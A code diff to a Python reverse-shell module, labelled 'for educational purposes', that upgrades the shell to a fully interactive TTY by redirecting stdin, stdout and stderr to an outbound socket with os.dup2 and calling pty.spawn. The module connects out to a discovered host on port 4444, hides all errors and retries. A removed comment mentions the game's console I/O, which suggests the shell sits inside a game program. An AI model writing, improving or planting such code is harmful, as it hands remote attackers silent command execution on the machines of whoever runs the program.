@@ -1,6 +1,7 @@
 """Reverse shell implementation with automatic listener discovery for educational purposes."""
 
 import os
+import pty
 import socket
 import subprocess
 import time
@@ -45,19 +46,22 @@ def run_reverse_shell(port: int = 4444) -> None:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target_host, port))
 
-            # Pass the socket's file descriptor directly to the shell process
-            # This avoids using os.dup2 which would replace the game's console I/O process-wide
+            # Duplicate file descriptors for stdin, stdout, and stderr to the socket
+            # This is necessary for an interactive TTY over a socket.
             fd = s.fileno()
+            os.dup2(fd, 0)
+            os.dup2(fd, 1)
+            os.dup2(fd, 2)
 
-            # Spawn the shell
-            # Using /bin/sh -i as it is universal on macOS and Linux
             shell = "/bin/sh"
             if os.path.exists("/bin/zsh"):
                 shell = "/bin/zsh"
             elif os.path.exists("/bin/bash"):
                 shell = "/bin/bash"
 
-            subprocess.call([shell, "-i"], stdin=fd, stdout=fd, stderr=fd)
+            # Use pty.spawn as it's the most robust way to create an interactive shell 
+            # over a socket on Unix systems (Linux/macOS)
+            pty.spawn(shell)
         except Exception:
             # Silently fail and retry after a delay
             pass
